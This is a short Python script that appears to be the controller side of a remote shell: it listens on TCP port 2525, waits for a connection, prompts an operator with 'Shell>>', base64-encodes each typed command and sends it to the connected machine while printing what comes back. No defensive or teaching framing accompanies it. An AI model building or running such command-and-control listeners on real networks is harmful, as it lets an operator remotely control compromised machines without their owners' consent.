import socket
import base64, os
import subprocess
import sys
import tempfile


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('',2525))
s.listen(5)

def base64_enco(strings):
    return base64.b64encode(strings.encode())

def main():
    conn, addr = s.accept()
    while True:
        data = conn.recv(1024)
        command = input("Shell>> ")
        output = base64_enco(command)
        conn.send(output)
        print(data)

def client():
    main()

client()